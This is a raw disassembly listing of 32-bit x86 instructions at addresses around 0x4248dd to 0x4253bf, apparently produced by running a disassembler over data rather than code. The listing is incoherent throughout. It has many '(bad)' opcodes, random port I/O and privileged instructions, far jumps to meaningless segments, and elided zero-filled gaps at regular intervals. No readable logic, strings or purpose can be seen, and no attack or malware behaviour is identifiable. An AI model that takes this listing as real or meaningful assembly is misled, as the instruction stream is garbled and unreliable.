  4248dd:	push   cs
  4248de:	push   cs
  4248df:	adc    DWORD PTR [ebx+0xc],ebp
  4248e2:	daa    
  4248e3:	retf   0x8ce2
  4248e6:	imul   edx,DWORD PTR [esi],0xfbec37cc
  4248ec:	not    DWORD PTR [edx]
  4248ee:	xchg   esp,eax
  4248ef:	mov    ebp,0x57532957
  4248f4:	fidivr DWORD PTR [eax-0x68ed2abb]
  4248fa:	inc    eax
  4248fb:	mov    esp,0x1d6ef5ea
  424900:	xor    al,0x89
  424902:	mov    ds:0x664fb7c6,al
  424907:	push   ebp
  424908:	sub    eax,ebp
  42490a:	mov    cl,cl
  42490c:	mov    ebx,0xeaf7c1fc
  424911:	sbb    al,0x8
  424913:	or     al,0xc0
  424915:	(bad)  
  424916:	cmp    BYTE PTR [ecx+eax*4+0x3301f17e],ah
  42491d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42491e:	jecxz  0x4248e5
  424920:	sbb    eax,0x626c70d5
  424925:	iret   
  424926:	xor    eax,0x26448e72
  42492b:	dec    edi
  42492c:	inc    edx
  42492d:	mov    BYTE PTR [ebx],dl
  42492f:	mov    BYTE PTR [esi],al
  424931:	out    0x36,al
  424933:	je     0x4248f6
  424935:	ret    
  424936:	xor    eax,esi
  424938:	xchg   ebp,eax
  424939:	push   edi
  42493a:	dec    edx
  42493b:	xchg   ebp,eax
  42493c:	pop    ds
  42493d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42493e:	rcr    BYTE PTR [edx-0x48de88f4],0xf9
  424945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424946:	pop    edi
  424947:	arpl   WORD PTR [edi-0x11],bp
  42494a:	jecxz  0x424996
  42494c:	sub    cl,BYTE PTR [edx+0x3fdbf75c]
  424952:	ss mov ah,0x47
  424955:	mul    BYTE PTR [edi]
  424957:	lea    ecx,[edi]
  424959:	out    dx,al
  42495a:	jmp    0x4249d1
  42495c:	or     dl,BYTE PTR [edi]
  42495e:	mov    cl,0x2e
  424960:	(bad)  
  424961:	mov    ax,0x2da5
  424965:	cmc    
  424966:	xor    eax,0x3b348d36
  42496b:	leave  
  42496c:	mov    ebp,edi
  42496e:	pop    eax
  42496f:	mov    al,0x58
  424971:	jecxz  0x424907
  424973:	adc    DWORD PTR [edi+0x6264f23b],esp
  424979:	aas    
  42497a:	mov    WORD PTR [esi],ss
  42497c:	inc    edi
  42497d:	inc    ecx
  42497e:	shl    DWORD PTR [ecx+ebp*4-0x4b727886],cl
  424985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424986:	sti    
  424987:	out    dx,al
  424988:	or     BYTE PTR [ebx+0x4a56a04],al
  42498e:	int3   
  42498f:	rcl    BYTE PTR ds:0xeefa1c57,1
  424995:	mov    ah,0x7a
  424997:	add    dh,0xd3
  42499a:	mov    ebx,0xd0deb004
  42499f:	cli    
  4249a0:	adc    DWORD PTR [esi-0x3b],0x6
  4249a4:	test   eax,0x7ef6bc5e
  4249a9:	dec    esi
  4249aa:	bound  edi,QWORD PTR [edi]
  4249ac:	cmp    ch,BYTE PTR [ecx]
  4249ae:	sti    
  4249af:	lock mov ds:0xbf2ce777,al
  4249b5:	hlt    
  4249b6:	mov    ds:0x1d692493,eax
  4249bb:	jmp    0x42498d
  4249bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249be:	es inc eax
  4249c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249c1:	dec    ebx
	...
  424a32:	add    BYTE PTR [eax],al
  424a34:	xor    BYTE PTR ds:0xdf7d9f75,bh
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	in     eax,0x72
  424a42:	pop    ss
  424a43:	imul   edi,esp,0xf6000186
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    ah,ch
  424a4d:	cvttps2pi mm5,QWORD PTR [esi+0x5dc1ed67]
  424a54:	fisttp QWORD PTR [edx-0x6af1307b]
  424a5a:	xor    ecx,DWORD PTR [eax]
  424a5c:	and    eax,0x291c07e4
  424a61:	sar    DWORD PTR [eax+0x28],cl
  424a64:	mov    al,0xe9
  424a66:	cs push 0xd163476e
  424a6c:	test   DWORD PTR [eax-0x33],edi
  424a6f:	inc    ecx
  424a70:	dec    edx
  424a71:	cmp    DWORD PTR [edi+esi*2+0x62cf0931],edx
  424a78:	fst    DWORD PTR [edi]
  424a7a:	stos   DWORD PTR es:[edi],eax
  424a7b:	cld    
  424a7c:	and    eax,0xe8d5b774
  424a81:	lds    ecx,FWORD PTR [ebp+0x4a0eecb6]
  424a87:	leave  
  424a88:	mov    ecx,0x368ba83c
  424a8d:	enter  0xc04d,0x59
  424a91:	push   ecx
  424a92:	pop    edx
  424a93:	test   eax,0xd2cf4113
  424a98:	xchg   ebp,eax
  424a99:	add    eax,ebp
  424a9b:	nop    ecx
  424a9e:	add    DWORD PTR [ebx],edi
  424aa0:	mov    esp,0xaf36b206
  424aa5:	lods   eax,DWORD PTR ds:[esi]
  424aa6:	mov    ds:0xa60199fb,al
  424aab:	push   ecx
  424aac:	mov    ah,0x2d
  424aae:	aad    0x8
  424ab0:	in     eax,dx
  424ab1:	and    cl,BYTE PTR [edi]
  424ab3:	mov    ds:0xffabd763,eax
  424ab8:	jnp    0x424a9d
  424aba:	mov    dh,0x75
  424abc:	sub    esp,DWORD PTR [ebp+0x59]
  424abf:	pop    esp
  424ac0:	pusha  
  424ac1:	lds    ecx,FWORD PTR [edx]
  424ac3:	ret    0xa200
  424ac6:	cli    
  424ac7:	cwde   
  424ac8:	dec    edx
  424ac9:	mov    ebp,0x1147384
  424ace:	push   esi
  424acf:	pop    ebp
  424ad0:	ins    DWORD PTR es:[edi],dx
  424ad1:	xchg   DWORD PTR [ebx+0x30],esp
  424ad4:	arpl   WORD PTR [ebp+0x22b3c27],bx
  424ada:	add    ch,BYTE PTR [edx-0x6]
  424add:	arpl   si,di
  424adf:	cmp    al,0x25
  424ae1:	(bad)  ds:0xec1379d3
  424ae7:	xchg   esi,eax
  424ae8:	push   es
  424ae9:	sub    ecx,edi
  424aeb:	mov    bl,0xf3
  424aed:	add    DWORD PTR [ecx+0x254f2201],ebp
  424af3:	into   
  424af4:	pop    edx
  424af5:	xchg   ebx,eax
  424af6:	mov    ebx,0xa9a1c821
  424afb:	mov    DWORD PTR [eax],edx
  424afd:	aad    0xc1
  424aff:	xor    DWORD PTR [ecx+0x5],ebp
  424b02:	sub    BYTE PTR [esi+eiz*1+0x1074a33f],ch
  424b09:	jnp    0x424ae0
  424b0b:	lods   al,BYTE PTR ds:[esi]
  424b0c:	ror    DWORD PTR [ecx],cl
  424b0e:	xchg   ebp,eax
  424b0f:	scas   al,BYTE PTR es:[edi]
  424b10:	sbb    ah,BYTE PTR [edx+0x2f]
  424b13:	das    
  424b14:	js     0x424abf
  424b16:	cmp    al,0x56
  424b18:	clc    
  424b19:	fwait
  424b1a:	jne    0x424b0b
  424b1c:	inc    esi
  424b1d:	out    0xd8,eax
  424b1f:	movsx  ebp,WORD PTR [eax-0x66421d2f]
  424b26:	cdq    
  424b27:	call   0x1298:0x6f382b8f
  424b2e:	(bad)  
  424b2f:	pop    ecx
  424b30:	pusha  
  424b31:	loopne 0x424b34
  424b33:	lods   eax,DWORD PTR ds:[esi]
  424b34:	arpl   WORD PTR [ecx+0x5f],sp
  424b37:	scas   eax,DWORD PTR es:[edi]
  424b38:	push   eax
  424b39:	sbb    edx,DWORD PTR [edx+0x62981bad]
  424b3f:	dec    esp
  424b40:	pop    es
  424b41:	mov    edi,0x0
	...
  424bb2:	add    BYTE PTR [eax],al
  424bb4:	std    
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx+0x6046077f]
  424bc1:	(bad)  
  424bc2:	retf   0xf291
  424bc5:	xchg   DWORD PTR [ecx],eax
  424bc7:	add    dh,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    al,al
  424bcd:	in     al,dx
  424bce:	cmc    
  424bcf:	jp     0x424bef
  424bd1:	sbb    bl,BYTE PTR [eax]
  424bd3:	out    0xdc,al
  424bd5:	fbstp  TBYTE PTR [esi]
  424bd7:	or     eax,0xc464e98a
  424bdc:	scas   al,BYTE PTR es:[edi]
  424bdd:	into   
  424bde:	dec    ebp
  424be0:	and    eax,0xa23c8eb2
  424be5:	enter  0xb8f3,0xf5
  424be9:	int    0x61
  424beb:	lock cmp al,0x25
  424bee:	fisttp QWORD PTR [esi]
  424bf0:	jmp    0xcad1:0xece19120
  424bf7:	adc    al,0x59
  424bf9:	sub    BYTE PTR [edx-0x2d],0x58
  424bfd:	push   ebx
  424bfe:	mov    edx,0x5840908e
  424c03:	pop    esi
  424c04:	push   ds
  424c05:	addr16 fwait
  424c07:	pusha  
  424c08:	push   es
  424c09:	fs sub eax,0x338f4c4f
  424c0f:	adc    dl,al
  424c11:	ficomp DWORD PTR [eax-0x2319c167]
  424c17:	push   esp
  424c18:	or     edi,DWORD PTR fs:[esi+eax*2+0x33]
  424c1d:	lahf   
  424c1e:	sbb    al,0x74
  424c20:	in     al,0x87
  424c22:	sub    ecx,DWORD PTR [esi]
  424c24:	dec    eax
  424c25:	xlat   BYTE PTR ds:[ebx]
  424c26:	sbb    esp,DWORD PTR [eax+0x7307bfd8]
  424c2c:	adc    al,0xd0
  424c2e:	and    eax,0x9db5e076
  424c33:	push   edi
  424c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c35:	ds jecxz 0x424bce
  424c38:	cdq    
  424c39:	inc    ecx
  424c3a:	mov    dl,0xe4
  424c3c:	(bad)  
  424c3e:	or     eax,0x8fe3bf83
  424c43:	sahf   
  424c44:	repz sub ebp,DWORD PTR [ebx+0x37]
  424c48:	and    BYTE PTR [eax-0x3bb7396d],0x6d
  424c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c50:	ret    
  424c51:	(bad)  
  424c52:	imul   DWORD PTR [ecx-0x20bb5f08]
  424c58:	lods   al,BYTE PTR ds:[esi]
  424c59:	push   ecx
  424c5a:	inc    esp
  424c5b:	mov    BYTE PTR [ebx-0x5cae806c],bh
  424c61:	nop
  424c62:	cmp    eax,0x36b71c00
  424c67:	stos   DWORD PTR es:[edi],eax
  424c68:	aas    
  424c69:	mov    eax,ds:0x2aea7a44
  424c6e:	adc    al,0x4d
  424c70:	lahf   
  424c71:	dec    eax
  424c72:	nop    DWORD PTR [ecx]
  424c75:	js     0x424c6b
  424c77:	inc    ecx
  424c78:	add    dh,BYTE PTR [eax*1+0x2f98a3b9]
  424c7f:	jb     0x424cd5
  424c81:	push   edi
  424c82:	push   ds
  424c83:	stos   BYTE PTR es:[edi],al
  424c84:	mov    cl,0x32
  424c86:	test   dh,dl
  424c88:	test   eax,0xac8b8aa1
  424c8d:	mov    al,0xc7
  424c8f:	sbb    DWORD PTR [ebp-0x1e],esi
  424c92:	mov    eax,0x43b13e27
  424c97:	ins    BYTE PTR es:[edi],dx
  424c98:	add    eax,0xdd5b29c
  424c9d:	and    al,0xaa
  424c9f:	jle    0x424c65
  424ca1:	xor    BYTE PTR [esi],dl
  424ca3:	jns    0x424c9e
  424ca5:	dec    edx
  424ca6:	mov    ebp,0xe0d4de48
  424cab:	ret    0x5212
  424cae:	mov    esp,0xbb9dae53
  424cb3:	(bad)  
  424cb5:	daa    
  424cb6:	adc    ecx,DWORD PTR [ebp+0x42b22cc0]
  424cbc:	inc    esi
  424cbd:	sahf   
  424cbe:	mov    ebx,0xf8280b
	...
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4-0x28cb6b29]
  424d42:	xchg   ebx,eax
  424d43:	inc    esp
  424d44:	call   0xf6424ed1
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [edi-0x51],cl
  424d4e:	mov    al,ds:0x6988b634
  424d53:	sbb    DWORD PTR [edx],0x4b4bc674
  424d59:	(bad)  
  424d5a:	popf   
  424d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d5c:	lods   al,BYTE PTR ds:[esi]
  424d5d:	and    al,0x87
  424d5f:	rcr    BYTE PTR [edx],cl
  424d61:	mov    ecx,0x2c9d2678
  424d66:	cs jl  0x424d79
  424d69:	pusha  
  424d6a:	inc    edx
  424d6b:	jge    0x424d09
  424d6d:	jecxz  0x424d84
  424d6f:	repnz scas eax,DWORD PTR es:[edi]
  424d71:	pop    ds
  424d72:	sti    
  424d73:	mov    ss,WORD PTR [esi+0x5628e54a]
  424d79:	mov    esi,0x326355f4
  424d7e:	sahf   
  424d7f:	idiv   DWORD PTR [ecx-0x183ea685]
  424d85:	sbb    ebp,ecx
  424d87:	(bad)  
  424d88:	popa   
  424d89:	inc    ecx
  424d8a:	push   ss
  424d8b:	pop    ebx
  424d8c:	iret   
  424d8d:	or     al,0x73
  424d8f:	or     ebx,edx
  424d91:	xchg   DWORD PTR [esi-0x776ee495],ebp
  424d97:	mov    ch,0xbd
  424d99:	dec    ebx
  424d9a:	lds    ecx,FWORD PTR [edi+0x7d]
  424d9d:	mov    dh,0xe9
  424d9f:	mov    ecx,0x521e88a3
  424da4:	push   cs
  424da5:	ret    
  424da6:	mov    edi,0xe39e7e11
  424dab:	push   ecx
  424dac:	outs   dx,BYTE PTR ds:[esi]
  424dad:	fwait
  424dae:	jl     0x424d53
  424db0:	rcr    DWORD PTR [esi],0x0
  424db3:	xor    ecx,ebp
  424db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424db6:	(bad)  
  424db8:	pop    ecx
  424db9:	imul   ebp,ecx,0xd3e09f2a
  424dbf:	fwait
  424dc0:	jle    0x424e2d
  424dc2:	jb     0x424d87
  424dc4:	pop    edi
  424dc5:	inc    ecx
  424dc6:	out    0x4e,eax
  424dc8:	stc    
  424dc9:	and    edx,0x7d73cfd5
  424dcf:	jno    0x424df5
  424dd1:	jnp    0xe801f4b5
  424dd7:	sub    al,0x3
  424dda:	xor    al,BYTE PTR [edi+0x68d7d6c8]
  424de0:	pop    eax
  424de1:	mov    edi,0xcc65ef81
  424de6:	inc    eax
  424de7:	je     0x424df4
  424de9:	and    ch,BYTE PTR [ebp-0x7d51050e]
  424def:	shr    BYTE PTR [ecx],cl
  424df1:	mov    eax,0x7d7f53a2
  424df6:	or     ah,ah
  424df8:	pop    ecx
  424df9:	aas    
  424dfa:	adc    DWORD PTR [ebx-0x1bbe2a86],ebx
  424e00:	(bad)  [edi-0xf]
  424e03:	push   ebp
  424e04:	stos   DWORD PTR es:[edi],eax
  424e05:	and    eax,0x7da58363
  424e0a:	xor    al,0xe2
  424e0c:	mov    al,ds:0xf42820a0
  424e11:	jnp    0x424e60
  424e13:	jmp    0x424dca
  424e15:	xor    al,0x5d
  424e17:	add    esp,esp
  424e19:	sbb    bl,ah
  424e1b:	aam    0xff
  424e1d:	push   0x7
  424e1f:	repz inc edx
  424e21:	mov    bl,BYTE PTR [edi-0x1b641f57]
  424e27:	sub    ebp,DWORD PTR [edx-0x4d083585]
  424e2d:	fdivrp st(2),st
  424e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e30:	jg     0x424dc2
  424e32:	dec    ebx
  424e33:	pop    ebx
  424e34:	sub    eax,0x2c65a7ca
  424e39:	push   0x7f
  424e3b:	sub    eax,0x79ab04a6
  424e40:	push   ebp
  424e41:	mov    esi,0x0
	...
  424eb2:	add    BYTE PTR [eax],al
  424eb4:	scas   al,BYTE PTR es:[edi]
  424eb5:	call   0x9fff:0xff74b964
  424ebc:	xchg   edx,eax
  424ebd:	dec    ebp
  424ebe:	lea    edx,[edx+0x79f61276]
  424ec4:	fimul  WORD PTR [ecx+0xf60001]
  424eca:	add    BYTE PTR [eax],al
  424ecc:	push   ds
  424ecd:	(bad)  
  424ece:	mov    eax,ds:0xd122c1df
  424ed3:	cmp    ecx,DWORD PTR [eax+0x6d]
  424ed6:	push   es
  424ed7:	scas   eax,DWORD PTR es:[edi]
  424ed8:	sbb    esp,DWORD PTR [edi+edx*8]
  424edb:	sub    eax,esp
  424edd:	inc    DWORD PTR [eax]
  424edf:	mov    ebx,0x86f28ed9
  424ee4:	and    al,cl
  424ee6:	or     esi,DWORD PTR [eax]
  424ee8:	jae    0x424efc
  424eea:	push   ss
  424eeb:	nop
  424eec:	shr    ebx,1
  424eee:	and    DWORD PTR [edi+0x2694f7d],esp
  424ef4:	xchg   ecx,eax
  424ef5:	and    al,0x34
  424ef7:	inc    eax
  424ef8:	mov    ds,ebx
  424efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424efb:	nop
  424efc:	pop    ebx
  424efd:	push   ss
  424efe:	or     eax,0x2c1c9ff1
  424f03:	sub    esi,eax
  424f05:	je     0x424ea0
  424f07:	push   ebp
  424f08:	ret    0xbfd1
  424f0b:	stos   BYTE PTR es:[edi],al
  424f0c:	fisttp QWORD PTR [edi+0x1c]
  424f0f:	aad    0xd5
  424f11:	(bad)  
  424f12:	push   ss
  424f13:	test   al,0xe0
  424f15:	bound  edi,QWORD PTR [edx-0x42]
  424f18:	cmp    esi,0x90d67180
  424f1e:	xor    BYTE PTR ds:0x8827c5f4,dh
  424f24:	popa   
  424f25:	cs jmp 0x424f1a
  424f28:	and    DWORD PTR [eax+0x52277172],0xffffff9d
  424f2f:	cs ret 
  424f31:	push   ds
  424f32:	push   ds
  424f33:	pop    eax
  424f34:	mov    esp,0xd75cd28
  424f39:	jge    0x424f15
  424f3b:	jae    0x424fb6
  424f3d:	mov    bh,0xb
  424f3f:	xor    bl,ah
  424f41:	loopne 0x424f28
  424f43:	inc    edx
  424f44:	daa    
  424f45:	outs   dx,DWORD PTR ds:[esi]
  424f46:	add    DWORD PTR [edi],ebx
  424f48:	(bad)  
  424f49:	cmp    al,0xa1
  424f4b:	and    dl,BYTE PTR [ebx-0x3bdc6cac]
  424f51:	outs   dx,DWORD PTR ds:[esi]
  424f52:	or     al,0x89
  424f54:	lods   al,BYTE PTR ds:[esi]
  424f55:	pop    dx
  424f57:	cmp    dl,bh
  424f59:	xor    BYTE PTR ds:0xa6c85961,dh
  424f5f:	les    ebp,FWORD PTR ds:0x77306008
  424f65:	push   0xffffffeb
  424f67:	and    bh,cl
  424f69:	mov    ch,BYTE PTR [esi-0xdaaf222]
  424f6f:	add    BYTE PTR [ebx],ah
  424f71:	jo     0x424f2b
  424f73:	loope  0x424ff4
  424f75:	inc    ebp
  424f76:	sbb    eax,0x23e1e833
  424f7b:	aad    0xd8
  424f7d:	or     DWORD PTR [ebx],esi
  424f7f:	cmp    eax,DWORD PTR [eax-0x56]
  424f82:	inc    ecx
  424f83:	jae    0x424fed
  424f85:	out    dx,eax
  424f86:	sbb    ebx,edi
  424f88:	in     al,0xd3
  424f8a:	les    ebp,FWORD PTR [edi]
  424f8c:	xor    dl,BYTE PTR [edx]
  424f8e:	out    0xb9,eax
  424f90:	sbb    bh,BYTE PTR [edi]
  424f92:	sub    edi,eax
  424f94:	mov    edx,0xee42d25a
  424f99:	pop    ebx
  424f9a:	lods   eax,DWORD PTR ds:[esi]
  424f9b:	fs and edi,esp
  424f9e:	lock jg 0x424fc2
  424fa1:	loop   0x424f77
  424fa3:	xchg   BYTE PTR [eax+0x54],dh
  424fa6:	mov    bh,0xa7
  424fa8:	jmp    0x8b36:0xcc83f2ea
  424faf:	mov    al,ds:0xfba78354
  424fb4:	dec    esi
  424fb5:	rcl    DWORD PTR [esi-0x2],cl
  424fb8:	imul   ebx,DWORD PTR [edx],0xffffffb6
  424fbb:	push   ss
  424fbc:	jmp    0xc7:0x90e6a30
	...
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	dec    esp
  425041:	mov    ch,0x5e
  425043:	sub    eax,0x18ad4
  425048:	test   BYTE PTR [eax],0x0
  42504b:	add    BYTE PTR [eiz*2-0x1f0a83b9],dl
  425052:	xor    BYTE PTR [edx],dl
  425054:	add    edi,DWORD PTR [edi-0x68557068]
  42505a:	sti    
  42505b:	enter  0x2d8b,0xa0
  42505f:	inc    ecx
  425060:	aas    
  425061:	ficomp DWORD PTR cs:[edi-0x3c]
  425065:	pop    ebp
  425066:	retf   0x7c5d
  425069:	cmc    
  42506a:	xor    eax,0x9df63d47
  42506f:	push   eax
  425070:	push   eax
  425071:	mov    DWORD PTR [eax+0x59],ecx
  425074:	pop    ecx
  425075:	add    BYTE PTR [esi+0x58de0d3c],bl
  42507b:	jb     0x425017
  42507d:	ss inc eax
  42507f:	mov    al,dl
  425081:	or     DWORD PTR [ecx-0x1f15fa5f],ebx
  425087:	add    edx,DWORD PTR [edx+0x5f09a620]
  42508d:	jecxz  0x4250dd
  42508f:	mov    ds:0xbbc0be92,eax
  425094:	repz or eax,0x24366314
  42509a:	jb     0x425104
  42509c:	test   DWORD PTR [edi-0x5d],edi
  42509f:	and    BYTE PTR [ebp-0x37cf9757],dh
  4250a5:	mov    edi,0x9022607f
  4250aa:	xchg   ecx,eax
  4250ab:	scas   al,BYTE PTR es:[edi]
  4250ac:	adc    BYTE PTR ds:0xc3a3b8d,al
  4250b2:	push   ebp
  4250b3:	lea    ebx,cs:[edi]
  4250b6:	mov    edi,edi
  4250b8:	mov    bl,dl
  4250ba:	mov    BYTE PTR [ebx+0xe135ff5],bh
  4250c0:	cs mov dh,0xd7
  4250c3:	jns    0x42512d
  4250c5:	lock sbb eax,0xc300828
  4250cb:	mov    al,0xc9
  4250cd:	xor    BYTE PTR [eax-0x38b1dbb3],cl
  4250d3:	or     al,0x54
  4250d5:	dec    ebx
  4250d6:	loop   0x425084
  4250d8:	ret    
  4250d9:	pop    ecx
  4250da:	jmp    0x45cb751f
  4250df:	mov    al,ds:0x6cba5a5d
  4250e4:	inc    edi
  4250e5:	jne    0x4250f0
  4250e7:	push   0x67
  4250e9:	fidivr WORD PTR [edx+0x5c]
  4250ec:	shl    DWORD PTR [ecx],1
  4250ee:	dec    ebp
  4250ef:	in     eax,0xf3
  4250f1:	(bad)  
  4250f2:	push   ss
  4250f3:	enter  0xa458,0x1e
  4250f7:	jmp    0x37df:0xdea618bf
  4250fe:	fldenv [ebp-0x70]
  425101:	inc    ebp
  425102:	or     al,0x47
  425104:	pop    ecx
  425105:	mov    eax,ds:0xfd640812
  42510a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42510b:	cmp    eax,0xe6bfc4c4
  425110:	jne    0x425131
  425112:	sbb    al,0x9
  425114:	(bad)  
  425115:	fidiv  DWORD PTR [ebp+0xd1c8c93]
  42511b:	aaa    
  42511c:	dec    ecx
  42511d:	xchg   BYTE PTR [ebp-0x3e6ce942],dh
  425123:	fidiv  WORD PTR [ebx+0x74343095]
  425129:	pop    edx
  42512a:	callw  0xb30
  42512e:	mov    cl,0xdd
  425130:	loop   0x42515b
  425132:	pop    ds
  425133:	sub    al,0x61
  425135:	outs   dx,BYTE PTR ds:[esi]
  425136:	pop    edx
  425137:	mov    dl,0x63
  425139:	aad    0xfc
  42513b:	mov    edi,0x4279631a
  425140:	push   ebx
  425141:	aaa    
	...
  4251b2:	add    BYTE PTR [eax],al
  4251b4:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	fwait
  4251c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251c2:	bound  esp,QWORD PTR [edi]
  4251c4:	retf   0x18b
  4251c7:	add    dh,dh
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR [ebp-0x5a91072d],bl
  4251d1:	dec    ebx
  4251d2:	(bad)  
  4251d3:	(bad)  
  4251d4:	jnp    0x425190
  4251d6:	pop    ecx
  4251d7:	cdq    
  4251d8:	jbe    0x425171
  4251da:	cli    
  4251db:	sti    
  4251dc:	mov    eax,ds:0xd424491e
  4251e1:	jno    0x425258
  4251e3:	push   esp
  4251e4:	dec    ebp
  4251e5:	lods   al,BYTE PTR ds:[esi]
  4251e6:	(bad)
  4251e9:	xchg   esp,eax
  4251ea:	sti    
  4251eb:	fwait
  4251ec:	add    DWORD PTR [ebx+ebp*2],ebx
  4251ef:	adc    BYTE PTR [ecx+0x7603e2eb],0xf8
  4251f6:	icebp  
  4251f7:	clc    
  4251f8:	sub    edi,0x3c
  4251fb:	jns    0x425231
  4251fd:	outs   dx,BYTE PTR ds:[esi]
  4251fe:	mov    edi,0x7764f8c3
  425203:	inc    ecx
  425204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425205:	xor    BYTE PTR [eax],dh
  425207:	xchg   DWORD PTR [ebx-0x45],edx
  42520a:	lods   al,BYTE PTR ds:[esi]
  42520b:	mov    dl,0x8a
  42520d:	jbe    0x425198
  42520f:	test   DWORD PTR [ebp+0x76f51b3b],edx
  425215:	iret   
  425216:	mov    bl,0x69
  425218:	pushf  
  425219:	test   DWORD PTR [ebx+edx*4+0x11],esi
  42521d:	fnsave [eax-0x55]
  425220:	or     BYTE PTR [ebx+0x67],ch
  425223:	das    
  425224:	mov    ds:0xe9adee01,al
  425229:	test   BYTE PTR es:[esi+0x1b],cl
  42522d:	mov    BYTE PTR [edi],al
  42522f:	fisubr DWORD PTR [edi-0x3f5ff53d]
  425235:	fimul  DWORD PTR [ebx+0x1b55c484]
  42523b:	mov    esi,0x950d001e
  425240:	add    dl,BYTE PTR [ebx-0x24f8b6f2]
  425246:	jmp    0x2c65babf
  42524b:	jns    0x425212
  42524d:	xchg   ebp,eax
  42524e:	lds    ebx,FWORD PTR [edx+0x46]
  425251:	pop    eax
  425252:	inc    eax
  425253:	add    BYTE PTR [ecx+ebp*8+0x794b9010],bl
  42525a:	imul   edi,DWORD PTR [esi],0x18
  42525d:	loope  0x4251e0
  42525f:	les    ebx,FWORD PTR [edi-0x27111f43]
  425265:	out    0xfc,eax
  425267:	mov    dl,0x2d
  425269:	adc    BYTE PTR [ecx+0x5e],dl
  42526c:	(bad)  
  42526d:	cmp    al,0xbb
  42526f:	jo     0x42520c
  425271:	lock nop
  425273:	jmp    0x425229
  425275:	cwde   
  425276:	fst    QWORD PTR [eax]
  425278:	adc    eax,DWORD PTR [eax+0x72]
  42527b:	(bad)  
  42527c:	and    BYTE PTR es:[edx+eax*4],bh
  425280:	jo     0x4252bf
  425282:	mov    ecx,0x4237384c
  425287:	dec    esp
  425288:	(bad)  
  425289:	push   ecx
  42528a:	mov    al,ds:0x9fa2222a
  42528f:	mov    gs,esp
  425291:	imul   esp,edx,0x63
  425294:	inc    eax
  425295:	jmp    0x42530e
  425297:	xor    dh,BYTE PTR [ecx+ebx*4+0x62]
  42529b:	dec    edx
  42529c:	into   
  42529d:	cs (bad) 
  42529f:	je     0x425298
  4252a1:	outs   dx,DWORD PTR ds:[esi]
  4252a2:	push   cs
  4252a3:	xor    al,0x34
  4252a5:	cmp    BYTE PTR [ebp+0x717957ec],bh
  4252ab:	and    al,0x17
  4252ad:	mov    BYTE PTR [ebx-0x3b],al
  4252b0:	lock or eax,0x93dc774
  4252b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252b7:	rcr    DWORD PTR [edx+eiz*4-0x3c0fe66f],1
  4252be:	fimul  WORD PTR [esi+edx*2]
  4252c1:	in     al,0x0
	...
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz push eax
  425341:	out    dx,eax
  425342:	mov    dh,0x87
  425344:	ror    BYTE PTR [ecx+eax*1+0xf600],0x0
  42534c:	push   esi
  42534d:	in     al,0xc7
  42534f:	(bad)  
  425350:	xor    BYTE PTR [ebp+0x5e],dl
  425353:	jne    0x4253cf
  425355:	shl    DWORD PTR [eax],cl
  425357:	jo     0x4253a4
  425359:	(bad)  
  42535c:	iret   
  42535d:	lea    edx,[eax+0x35727640]
  425363:	cli    
  425364:	repnz aaa 
  425366:	add    eax,0xd2b36f5b
  42536b:	into   
  42536c:	je     0x4253e9
  42536e:	adc    esp,DWORD PTR [edx-0x23]
  425371:	in     al,dx
  425372:	jp     0x42538c
  425374:	out    0x79,eax
  425376:	add    esp,DWORD PTR [eax+0x8]
  425379:	push   edi
  42537a:	pop    esp
  42537b:	retf   
  42537c:	jmp    0x5842:0xf1bff454
  425383:	mov    bl,0x7b
  425385:	inc    edi
  425386:	xlat   BYTE PTR ds:[ebx]
  425387:	mov    gs,WORD PTR [edx+0x10ee0a94]
  42538d:	pop    ss
  42538e:	xchg   ebp,eax
  42538f:	cli    
  425390:	mov    ah,BYTE PTR [esi]
  425392:	jnp    0x4253b8
  425394:	out    dx,eax
  425395:	push   ss
  425396:	mov    eax,0x9c2bdfff
  42539b:	call   FWORD PTR [edi-0x2de4f5fd]
  4253a1:	push   0x6e
  4253a3:	dec    esp
  4253a4:	outs   dx,BYTE PTR ds:[esi]
  4253a5:	jp     0x425340
  4253a7:	call   0x6e3bed18
  4253ac:	aad    0x19
  4253ae:	jecxz  0x4253c2
  4253b0:	cmp    DWORD PTR [edi],esp
  4253b2:	cdq    
  4253b3:	xchg   esi,eax
  4253b4:	add    al,0xac
  4253b6:	and    al,0x66
  4253b8:	or     al,0x9f
  4253ba:	stc    
  4253bb:	jle    0x425425
  4253bd:	int    0xac
  4253bf:	xor    bh,BYTE PTR [ebx+0x56]
